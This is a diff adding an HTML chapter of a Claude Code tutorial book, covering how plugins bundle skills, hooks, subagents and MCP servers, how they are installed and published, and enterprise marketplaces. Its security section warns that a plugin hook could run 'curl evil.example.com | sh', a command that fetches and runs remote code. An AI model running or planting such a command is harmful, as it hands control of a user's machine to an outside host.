@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chapter 15: Plugins &amp; the Marketplace Ecosystem | Claude Power User For Dummies</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💪</text></svg>">
+  <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+
+  <nav class="top-nav">
+    <span class="nav-title">Claude Power User</span>
+    <div class="nav-links">
+      <a href="index.html">Contents</a>
+      <a href="14-subagents.html">&larr; Prev</a>
+      <a href="maps/15-plugins-marketplace-map.html">🧠 Map</a>
+      <button class="theme-toggle" aria-label="Toggle theme">🌙</button>
+    </div>
+  </nav>
+
+  <header class="chapter-header">
+    <span class="chapter-number">Chapter 15</span>
+    <h1>Plugins &amp; the Marketplace Ecosystem</h1>
+    <p class="subtitle">Bundle skills + hooks + subagents + MCP into one installable unit &mdash; and tap into the thousands already published</p>
+  </header>
+
+  <main>
+
+    <p>By now you've built skills (Chapter 6), hooks (Chapter 6), subagents (Chapter 14), and you may have wired up an MCP server or two. Each one of those lives in its own corner of <code>.claude/</code> &mdash; useful for your project, easy to lose when you switch repos, awkward to share with a teammate beyond "copy these five files into your <code>.claude/</code> directory and good luck."</p>
+
+    <p>Plugins fix that. A plugin is a <strong>single installable bundle</strong> that can ship skills, hooks, subagents, MCP servers, slash commands, LSP servers, background monitors, and even default settings. Install one with <code>/plugin install</code>; uninstall it just as cleanly. Publish your own to a marketplace; pull updates by bumping a version. The packaging story Claude Code was missing in 2025 is now a first-class feature, with thousands of community plugins already in the wild.</p>
+
+    <div class="highlight-box">
+      <p><strong>The packaging layer:</strong> standalone configs in <code>.claude/</code> are great for personal experiments and one-off projects. The moment you want to share with your team, version your work, or pull in someone else's polished workflow &mdash; that's a plugin.</p>
+    </div>
+
+    <h2>What's in a Plugin?</h2>
+
+    <p>The Claude Code docs are explicit about what a plugin can bundle. Almost every customization mechanism you've learned in this book can ship inside one:</p>
+
+    <table>
+      <thead>
+        <tr><th>Component</th><th>Plugin directory</th><th>What it adds</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Manifest</td><td><code>.claude-plugin/plugin.json</code></td><td>Required. Plugin name, description, version, author.</td></tr>
+        <tr><td>Skills</td><td><code>skills/</code></td><td>Folders with <code>SKILL.md</code> files &mdash; namespaced as <code>/plugin-name:skill-name</code>.</td></tr>
+        <tr><td>Subagents</td><td><code>agents/</code></td><td>Custom subagent definitions (same format as <code>.claude/agents/</code>).</td></tr>
+        <tr><td>Hooks</td><td><code>hooks/hooks.json</code></td><td>Lifecycle hooks. Same schema as <code>settings.json</code> hooks.</td></tr>
+        <tr><td>MCP servers</td><td><code>.mcp.json</code></td><td>External tool integrations (databases, GitHub, Sentry, &hellip;).</td></tr>
+        <tr><td>LSP servers</td><td><code>.lsp.json</code></td><td>Language server bindings for code intelligence.</td></tr>
+        <tr><td>Background monitors</td><td><code>monitors/monitors.json</code></td><td>Long-running watchers (log tailers, status pollers) that notify Claude as events arrive.</td></tr>
+        <tr><td>Bin scripts</td><td><code>bin/</code></td><td>Executables added to the Bash tool's <code>PATH</code> while the plugin is enabled.</td></tr>
+        <tr><td>Default settings</td><td><code>settings.json</code></td><td>Currently <code>agent</code> and <code>subagentStatusLine</code> only. Activates a plugin agent as the main thread when enabled.</td></tr>
+      </tbody>
+    </table>
+
+    <div class="warning-box">
+      <p><strong>Common mistake:</strong> only <code>plugin.json</code> goes inside <code>.claude-plugin/</code>. Everything else (<code>skills/</code>, <code>agents/</code>, <code>hooks/</code>, <code>.mcp.json</code>, etc.) lives at the plugin root. Nest them inside <code>.claude-plugin/</code> and they silently won't load.</p>
+    </div>
+
+    <h2>Standalone vs Plugin: Which Do You Want?</h2>
+
+    <p>The official guidance is pretty clean. Skills you keep iterating on personally? Standalone. Skills you want a teammate to install with one command and update with a <code>git pull</code>? Plugin.</p>
+
+    <div class="before-after">
+      <div class="before">
+        <strong>Standalone (<code>.claude/</code>)</strong>
+        <p>Quick to write, quick to change. Skills get short names like <code>/deploy</code>. Lives only in this project (or your home dir). Sharing means "copy these files." No versioning beyond git history of the host repo.</p>
+      </div>
+      <div class="after">
+        <strong>Plugin (<code>.claude-plugin/plugin.json</code>)</strong>
+        <p>One <code>/plugin install</code> away for anyone. Skills are namespaced (<code>/my-pack:deploy</code>) so two plugins can't clash. Versioned via the manifest or git SHA. Reusable across every repo you open.</p>
+      </div>
+    </div>
+
+    <h2>The Marketplace Universe</h2>
+
+    <p>A <strong>marketplace</strong> is a catalog Claude Code can install plugins from. Three flavors are worth knowing:</p>
+
+    <ul>
+      <li><strong>Official Anthropic marketplace</strong> &mdash; <code>claude-plugins-official</code>, hosted at <a href="https://github.com/anthropics/claude-plugins-official">github.com/anthropics/claude-plugins-official</a>. Auto-available the moment you launch Claude Code; no setup. Browseable in-app via <code>/plugin</code> or on the web at <code>claude.com/plugins</code>.</li>
+      <li><strong>Community/curated marketplaces</strong> &mdash; <a href="https://buildwithclaude.com/">buildwithclaude.com</a>, <a href="https://claudemarketplaces.com/">claudemarketplaces.com</a>, the awesome lists. You add these manually with <code>/plugin marketplace add &lt;source&gt;</code>.</li>
+      <li><strong>Private enterprise marketplaces</strong> &mdash; teams behind Cowork ship internal-only plugins to authorized employees (more on this below).</li>
+    </ul>
+
+    <p>There's also a separate <strong>demo</strong> marketplace called <code>claude-code-plugins</code> that Anthropic maintains for example plugins &mdash; you add it manually if you want to study patterns from working code.</p>
+
+    <p>What does the install flow actually look like? Here's a session installing an LSP plugin from the official marketplace:</p>
+
+    <div class="claude-example">
+      <div class="user-msg">/plugin</div>
+      <div class="claude-msg">Plugin Manager &mdash; tabs: <em>Discover</em> | <em>Installed</em> | <em>Marketplaces</em> | <em>Errors</em><br><br><strong>Discover (claude-plugins-official)</strong><br>&nbsp;&nbsp;&bull; typescript-lsp &mdash; Language server for TypeScript<br>&nbsp;&nbsp;&bull; python-lsp &mdash; Language server for Python<br>&nbsp;&nbsp;&bull; rust-lsp &mdash; Language server for Rust<br>&nbsp;&nbsp;&bull; code-quality &mdash; Lint, format, and review skills<br>&nbsp;&nbsp;&hellip;</div>
+      <div class="user-msg">/plugin install typescript-lsp@claude-plugins-official</div>
+      <div class="claude-msg">Installed <code>typescript-lsp</code> v2.4.1 from <code>claude-plugins-official</code>.<br>Loaded 1 LSP server (typescript), 2 skills (<code>/typescript-lsp:find-refs</code>, <code>/typescript-lsp:rename-symbol</code>).<br>Run <code>/help</code> to see them in your skill list.</div>
+    </div>
+
+    <p>That's the whole experience. One command, full TypeScript code intelligence and two new skills, available in every session you start in this project.</p>
+
+    <h2>Installing &amp; Managing Plugins</h2>
+
+    <p>Plugin management lives behind one command: <code>/plugin</code>. It opens a tabbed interface for browsing, installing, updating, removing, and seeing load errors.</p>
+
+    <div class="shortcut-box">
+      <p><strong><code>/plugin</code></strong> &mdash; opens the plugin manager UI. Tabs: <em>Discover</em>, <em>Installed</em>, <em>Marketplaces</em>, <em>Errors</em>. Cycle with <kbd>Tab</kbd> / <kbd>Shift</kbd>+<kbd>Tab</kbd>.</p>
+      <p><strong><code>/plugin install &lt;name&gt;@&lt;marketplace&gt;</code></strong> &mdash; e.g., <code>/plugin install code-quality@claude-plugins-official</code>.</p>
+      <p><strong><code>/plugin marketplace add &lt;url-or-repo&gt;</code></strong> &mdash; add a community or private marketplace.</p>
+      <p><strong><code>/reload-plugins</code></strong> &mdash; hot-reload after editing a plugin file. No restart needed.</p>
+      <p><strong><code>--plugin-dir ./path</code></strong> CLI flag &mdash; load a local plugin directory for testing without publishing.</p>
+    </div>
+
+    <h3>Marketplace subcommands worth knowing</h3>
+
+    <p>The <code>/plugin marketplace</code> subcommands cover the full marketplace lifecycle. Most teams need three of them:</p>
+
+    <table>
+      <thead>
+        <tr><th>Command</th><th>What it does</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><code>/plugin marketplace add &lt;source&gt;</code></td><td>Add a marketplace. Source can be a git URL, a GitHub <code>owner/repo</code> shorthand, or a local path.</td></tr>
+        <tr><td><code>/plugin marketplace list</code></td><td>List marketplaces this Claude Code session knows about.</td></tr>
+        <tr><td><code>/plugin marketplace refresh</code></td><td>Pull the latest manifests &mdash; do this after a teammate publishes a new plugin or version.</td></tr>
+        <tr><td><code>/plugin marketplace remove &lt;name&gt;</code></td><td>Drop a marketplace. Plugins installed from it are not uninstalled automatically.</td></tr>
+      </tbody>
+    </table>
+
+    <p>For team-wide setup, you can configure a marketplace at the <em>repo</em> level by adding it to <code>.claude/settings.json</code> &mdash; everyone who opens the project gets the same marketplace without typing anything.</p>
+
+    <h2>Anatomy of a Plugin: a Walkthrough</h2>
+
+    <p>Here's the smallest possible plugin &mdash; manifest plus one skill:</p>
+
+    <pre><code>my-first-plugin/
+├── .claude-plugin/
+│   └── plugin.json
+└── skills/
+    └── hello/
+        └── SKILL.md</code></pre>
+
+    <p>The manifest is just JSON:</p>
+
+    <pre><code>{
+  "name": "my-first-plugin",
+  "description": "A greeting plugin to learn the basics",
+  "version": "1.0.0",
+  "author": { "name": "Your Name" }
+}</code></pre>
+
+    <p>And the skill is a Markdown file with frontmatter:</p>
+
+    <pre><code>---
+description: Greet the user with a personalized message
+---
+
+# Hello Skill
+
+Greet the user named "$ARGUMENTS" warmly and ask how you can help them today.</code></pre>
+
+    <p>Test it locally without publishing anywhere:</p>
+
+    <div class="claude-example">
+      <div class="user-msg">$ claude --plugin-dir ./my-first-plugin</div>
+      <div class="claude-msg">Loaded 1 plugin: my-first-plugin (v1.0.0)<br>1 skill registered: <code>/my-first-plugin:hello</code></div>
+      <div class="user-msg">/my-first-plugin:hello Sara</div>
+      <div class="claude-msg">Hi Sara! 👋 Great to have you here. What would you like to work on today?</div>
+    </div>
+
+    <p>That's the entire feedback loop &mdash; edit, <code>/reload-plugins</code>, try again. When you're ready to share, push to a git repo and have your teammate <code>/plugin marketplace add &lt;your-repo&gt;</code> followed by <code>/plugin install my-first-plugin@&lt;your-marketplace&gt;</code>. They'll pull updates from then on with <code>/plugin marketplace refresh</code> &mdash; no further manual sync needed.</p>
+
+    <h2>Going Beyond Skills: the Full Bundle</h2>
+
+    <p>A real-world plugin is rarely just one skill. The interesting plugins layer the primitives you already know. Below are typical patterns:</p>
+
+    <div class="map-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1rem; margin: 1.5rem 0;">
+      <div class="tool-card">
+        <div class="tool-icon">🌐</div>
+        <div class="tool-info">
+          <div class="tool-name">Language Pack</div>
+          <div class="tool-desc">LSP server for the language + a code-reviewer subagent + a few language-specific skills + a hook that runs the linter on every save.</div>
+        </div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🚨</div>
+        <div class="tool-info">
+          <div class="tool-name">On-call Plugin</div>
+          <div class="tool-desc">MCP server for PagerDuty + monitors that tail logs + skills like <code>/incident-summary</code> and <code>/post-mortem</code>.</div>
+        </div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🛡️</div>
+        <div class="tool-info">
+          <div class="tool-name">Security Pack</div>
+          <div class="tool-desc">Security-reviewer subagent (read-only), <code>PreToolUse</code> hook that blocks risky commands, skills for OWASP categories, <code>settings.json</code> activates the reviewer as the main thread.</div>
+        </div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-icon">🎨</div>
+        <div class="tool-info">
+          <div class="tool-name">Design System Pack</div>
+          <div class="tool-desc">Skills that know your component library, MCP server pointing at your tokens, a hook that auto-fixes inline styles, <code>bin/</code> with your codegen CLI on PATH.</div>
+        </div>
+      </div>
+    </div>
+
+    <p>The <code>settings.json</code> trick is especially nice: ship a plugin whose <code>settings.json</code> sets <code>"agent": "security-reviewer"</code>, and any project that enables the plugin runs the whole session as that subagent. One install, fully transformed environment.</p>
+
+    <h3>Background monitors in a plugin</h3>
+
+    <p>Background monitors are the least-known plugin feature and arguably the most useful for teams. A monitor is a long-running shell command whose stdout lines are delivered to Claude as notifications during the session &mdash; without you having to instruct the model to start watching.</p>
+
+    <p>Drop <code>monitors/monitors.json</code> at the plugin root:</p>
+
+    <pre><code>[
+  {
+    "name": "error-log",
+    "command": "tail -F ./logs/error.log",
+    "description": "Application error log"
+  },
+  {
+    "name": "ci-status",
+    "command": "while true; do gh run list --limit 1 --json status,conclusion; sleep 60; done",
+    "description": "Latest CI status, polled every 60s"
+  }
+]</code></pre>
+
+    <p>When the plugin is enabled, Claude Code auto-starts each monitor at session start. New errors? CI just turned red? Claude sees the line as it arrives and can react proactively &mdash; "I notice your last test run failed; want me to look at the failure?"</p>
+
+    <h2>Converting Standalone Configs to a Plugin</h2>
+
+    <p>If you've already built up a <code>.claude/</code> directory with skills, hooks, and subagents, the migration is mechanical:</p>
+
+    <ol>
+      <li>Create the manifest at <code>my-plugin/.claude-plugin/plugin.json</code>.</li>
+      <li>Move <code>.claude/commands/</code> &rarr; <code>my-plugin/commands/</code> (or rename to <code>skills/</code>).</li>
+      <li>Move <code>.claude/agents/</code> &rarr; <code>my-plugin/agents/</code>.</li>
+      <li>Move <code>.claude/skills/</code> &rarr; <code>my-plugin/skills/</code>.</li>
+      <li>If you had hooks in <code>settings.json</code>, copy the <code>hooks</code> block into <code>my-plugin/hooks/hooks.json</code>.</li>
+      <li>Test with <code>claude --plugin-dir ./my-plugin</code>.</li>
+    </ol>
+
+    <p>Once tested, delete the originals from <code>.claude/</code> to avoid duplicates &mdash; the plugin version takes precedence either way, but cleanup keeps things clear.</p>
+
+    <h2>Publishing &amp; Distribution</h2>
+
+    <p>You publish a plugin by putting it in a git repo and calling that repo a marketplace. Users add the marketplace, then install plugins from it &mdash; updates flow with a <code>git pull</code>.</p>
+
+    <p>Two versioning strategies:</p>
+
+    <ul>
+      <li><strong>Set a <code>version</code> field</strong> in <code>plugin.json</code>. Users get updates only when you bump it. Predictable, less noisy.</li>
+      <li><strong>Omit the <code>version</code> field</strong>. The git commit SHA becomes the version &mdash; every commit counts as a new version. Simpler for fast-iterating projects but noisier for users.</li>
+    </ul>
+
+    <p>To submit to the official Anthropic marketplace, use the in-app submission forms: <code>claude.ai/settings/plugins/submit</code> or <code>platform.claude.com/plugins/submit</code>. If you ship your own CLI tool, you can even prompt your users to install your plugin from inside it &mdash; see the docs on plugin hints.</p>
+
+    <h2>Private Enterprise Marketplaces (Cowork)</h2>
+
+    <p>On <strong>February 24, 2026</strong>, Anthropic shipped private plugin marketplaces alongside ten new department-specific plugins, twelve new MCP connectors, and a "Customize" admin control system. This is the enterprise story for plugins.</p>
+
+    <p>Enterprise admins build a private marketplace through the Customize menu in Cowork's admin settings. They can populate it with public Anthropic plugins, partner-built plugins, or custom ones &mdash; and back it with a private GitHub repo so the source code never leaves their infrastructure. Once plugins are in, admins control distribution three ways:</p>
+
+    <ul>
+      <li><strong>Per-user provisioning.</strong> Pick exactly which employees get which plugins.</li>
+      <li><strong>Auto-install.</strong> Push specific plugins to specific teams without anyone clicking install.</li>
+      <li><strong>Restricted visibility.</strong> Each team only sees the plugins relevant to their function (sales doesn't see the security pack; engineering doesn't see the SDR pack).</li>
+    </ul>
+
+    <p>Anthropic also publishes <a href="https://github.com/anthropics/knowledge-work-plugins"><code>knowledge-work-plugins</code></a> &mdash; an open-source repo of department-tuned plugins teams can fork and adapt instead of starting from scratch.</p>
+
+    <p>For developers, the practical impact: even if you're not on Cowork, the <em>same plugin format</em> powers public and private marketplaces. Whatever you build on the open ecosystem will work inside an enterprise marketplace later, and vice versa. There's no separate "enterprise SDK" &mdash; just one plugin spec, multiple distribution channels.</p>
+
+    <h2>The Twelve New MCP Connectors</h2>
+
+    <p>Cowork's February 2026 wave added twelve new MCP connectors covering most of an enterprise's daily-driver SaaS. Most of them ship as plugins:</p>
+
+    <table>
+      <thead>
+        <tr><th>Domain</th><th>Connectors</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Productivity</td><td>Google Calendar, Google Drive, Gmail</td></tr>
+        <tr><td>Sales &amp; Marketing</td><td>Apollo, Clay, Outreach, Similarweb</td></tr>
+        <tr><td>Legal &amp; Finance</td><td>DocuSign, LegalZoom, MSCI, FactSet, Harvey</td></tr>
+        <tr><td>Content</td><td>WordPress</td></tr>
+      </tbody>
+    </table>
+
+    <p>For developers, the productivity ones are the immediate wins &mdash; an agent that can read your calendar before drafting an email, or fetch a doc from Drive without you copy-pasting, makes every workflow a bit smoother.</p>
+
+    <h2>Plugins vs Skills vs Hooks vs Subagents: Decision Framework</h2>
+
+    <table>
+      <thead>
+        <tr><th>If you want to&hellip;</th><th>Reach for&hellip;</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Reuse a prompt template you keep typing</td><td><strong>Skill</strong></td></tr>
+        <tr><td>Make something fire automatically on an event</td><td><strong>Hook</strong></td></tr>
+        <tr><td>Run a specialist in its own context window</td><td><strong>Subagent</strong></td></tr>
+        <tr><td>Bundle and distribute several of the above as one unit</td><td><strong>Plugin</strong></td></tr>
+        <tr><td>Pull in someone else's polished workflow with one command</td><td><strong>Plugin (install)</strong></td></tr>
+        <tr><td>Standardize a department or team's Claude experience</td><td><strong>Plugin (private marketplace)</strong></td></tr>
+      </tbody>
+    </table>
+
+    <p>Plugins are the <em>delivery mechanism</em>; the other three are the <em>payload</em>. Most non-trivial Claude Code customizations end up as a plugin eventually &mdash; the only question is when.</p>
+
+    <p>The good news is that the conversion path is mechanical: anything you've built in <code>.claude/</code> can become a plugin without rewriting a single line of logic. So default to standalone while you're iterating, and graduate to a plugin the moment you find yourself copy-pasting your <code>.claude/</code> directory into a second project.</p>
+
+    <h2>Security Considerations</h2>
+
+    <ul class="checklist">
+      <li><strong>Untrusted plugins can run arbitrary code.</strong> A plugin can ship a hook that runs <code>curl evil.example.com | sh</code>. Treat marketplaces like npm: official sources first, vet the code before installing community plugins, never auto-install from a stranger.</li>
+      <li><strong>Plugin subagents have safety restrictions.</strong> By design, plugin subagents <em>cannot</em> set <code>hooks</code>, <code>mcpServers</code>, or <code>permissionMode</code> in their frontmatter &mdash; those fields are silently ignored. If you need them, copy the agent into your local <code>.claude/agents/</code>.</li>
+      <li><strong>Audit trail in <code>/plugin</code>.</strong> The plugin manager shows every plugin's source, version, and what it ships. Spend ten seconds in the <em>Errors</em> tab before debugging anything else &mdash; many "Claude Code is broken" complaints are actually a misbehaving plugin.</li>
+      <li><strong>Pin versions in shared environments.</strong> A team plugin without an explicit <code>version</code> field auto-updates on every commit. Pin it, or your "stable" review skill changes under your feet.</li>
+      <li><strong>Review the diff on plugin updates.</strong> Especially for plugins shipping hooks or MCP servers &mdash; a manifest update is also a permission update. Treat plugin upgrades like dependency upgrades: read the changelog, scan the diff, then merge.</li>
+      <li><strong>Use private marketplaces for sensitive workflows.</strong> Anything that touches credentials, internal endpoints, or proprietary code should ship through a private marketplace your team controls, not a public one anyone can fork or impersonate.</li>
+    </ul>
+
+    <h2>When Plugins Don't Load: Debugging Checklist</h2>
+
+    <p>About 80% of "my plugin isn't working" reports trace back to one of three things. Run through these before reaching for anything fancier.</p>
+
+    <ol>
+      <li><strong>Check the directory layout.</strong> Only <code>plugin.json</code> belongs inside <code>.claude-plugin/</code>. <code>skills/</code>, <code>agents/</code>, <code>hooks/</code>, <code>.mcp.json</code>, etc. all live at the plugin root, one level up. Nest them inside <code>.claude-plugin/</code> and they're invisible to the loader.</li>
+      <li><strong>Check the <em>Errors</em> tab in <code>/plugin</code>.</strong> The plugin manager surfaces every load error with the offending file path. Many "Claude is broken" sessions are actually one bad JSON file in one plugin.</li>
+      <li><strong>Test components individually.</strong> If a plugin has skills, hooks, and a subagent, disable them one at a time (or comment out one section of the manifest) to isolate which piece is failing. The fastest debug loop is <code>--plugin-dir</code> + <code>/reload-plugins</code> on a stripped-down version.</li>
+    </ol>
+
+    <p>If you're authoring against an installed marketplace plugin (you want to patch a community plugin without forking permanently), <code>--plugin-dir</code> with a same-named local copy <em>overrides</em> the marketplace version for that session. Edit, test, contribute the fix back upstream &mdash; without ever uninstalling.</p>
+
+    <h2>Power Move: the <code>--plugin-dir</code> Iteration Loop</h2>
+
+    <div class="power-tip">
+      <p><strong>Develop plugins like you develop code: in a tight loop.</strong> The <code>--plugin-dir</code> flag loads a local directory as a plugin without publishing or installing anything. Pair it with <code>/reload-plugins</code> for hot reload after edits and you have a real authoring workflow:</p>
+      <pre style="margin-top: 0.5rem;"><code>$ claude --plugin-dir ./my-plugin --plugin-dir ./other-plugin</code></pre>
+      <p>You can specify the flag multiple times to load several plugins together. If a local plugin shares a name with an installed marketplace plugin, the local copy wins for that session &mdash; perfect for testing patches against an installed plugin without uninstalling. Edit. <code>/reload-plugins</code>. Try it. Edit again. Ship when it works.</p>
+    </div>
+
+    <div class="exercise-box">
+      <h4>Bundle your favorite skill + hook + subagent into a plugin</h4>
+      <p>Take one skill, one hook, and one subagent you've already built (or built in earlier exercises) and ship them as a single private plugin to your team.</p>
+      <ol>
+        <li><strong>Create the plugin directory:</strong>
+          <pre style="margin: 0.5rem 0;"><code>mkdir -p my-team-pack/.claude-plugin
+echo '{"name": "my-team-pack", "description": "Our team standards", "version": "0.1.0"}' &gt; my-team-pack/.claude-plugin/plugin.json</code></pre>
+        </li>
+        <li><strong>Move your skill</strong> into <code>my-team-pack/skills/&lt;skill-name&gt;/SKILL.md</code>.</li>
+        <li><strong>Move your subagent</strong> into <code>my-team-pack/agents/&lt;agent-name&gt;.md</code>.</li>
+        <li><strong>Move your hook</strong> into <code>my-team-pack/hooks/hooks.json</code> (the format is identical to <code>settings.json</code>'s <code>hooks</code> block).</li>
+        <li><strong>Test locally</strong> with <code>claude --plugin-dir ./my-team-pack</code>. Try the skill (<code>/my-team-pack:&lt;name&gt;</code>), check the agent appears in <code>/agents</code>, verify the hook fires.</li>
+        <li><strong>Push to a private git repo</strong> &mdash; that repo is now your team's private marketplace.</li>
+        <li><strong>Onboard a teammate:</strong> have them run <code>/plugin marketplace add &lt;your-repo&gt;</code> followed by <code>/plugin install my-team-pack@&lt;your-marketplace&gt;</code>.</li>
+      </ol>
+      <p><strong>Bonus:</strong> add an MCP server to <code>.mcp.json</code> so your team gets the same external integrations &mdash; pointing at your bug tracker, design system, or API gateway.</p>
+    </div>
+
+    <h2>What's Coming Next</h2>
+
+    <p>You've now seen the full Claude Code customization stack: skills (Chapter 6), hooks (Chapter 6), subagents (Chapter 14), and plugins (this chapter) &mdash; with CLAUDE.md and memory underneath everything (Chapter 5). The pattern is hierarchical: standalone primitives in <code>.claude/</code>, bundled into plugins for distribution, exchanged through marketplaces for discovery. Each layer up is "harder to set up but easier to share."</p>
+
+    <p>The book wraps here for now. The Claude Code ecosystem is moving fast &mdash; new connectors, new lifecycle events, new collaboration features land monthly. Your job as a power user is to keep one eye on the <code>/plugin</code> Discover tab and one eye on Anthropic's changelog. Most of the techniques in this book are durable; the specific flags, model IDs, and feature names will keep evolving. Stay current; stay opinionated; stay curious.</p>
+
+    <div class="highlight-box">
+      <p><strong>The whole journey, in one paragraph:</strong> you started using Claude. You learned the products, mastered the CLI, configured CLAUDE.md, wrote skills and hooks, built workflows for review and debugging, scaled them to your team, codified them into a playbook, offloaded heavy work to managed agents, parallelized investigations with subagents, and now packaged everything you've built into plugins others can install with one command. That's the arc from <em>Claude user</em> to <em>Claude power user</em> &mdash; a system that compounds, sharable across humans, ready for whatever Anthropic ships next.</p>
+    </div>
+
+  </main>
+
+  <footer>
+    <nav class="chapter-nav">
+      <a href="14-subagents.html">
+        <span class="nav-direction">&larr; Previous chapter</span>
+        <span class="nav-chapter">Subagents</span>
+      </a>
+      <a href="index.html" class="next">
+        <span class="nav-direction">Back to contents</span>
+        <span class="nav-chapter">All Chapters</span>
+      </a>
+    </nav>
+  </footer>
+
+  <script>
+    const toggle = document.querySelector('.theme-toggle');
+    const saved = localStorage.getItem('theme') || 'light';
+    document.documentElement.setAttribute('data-theme', saved);
+    toggle.textContent = saved === 'dark' ? '☀️' : '🌙';
+    toggle.addEventListener('click', () => {
+      const current = document.documentElement.getAttribute('data-theme');
+      const next = current === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+      toggle.textContent = next === 'dark' ? '☀️' : '🌙';
+    });
+  </script>
+
+</body>
+</html>
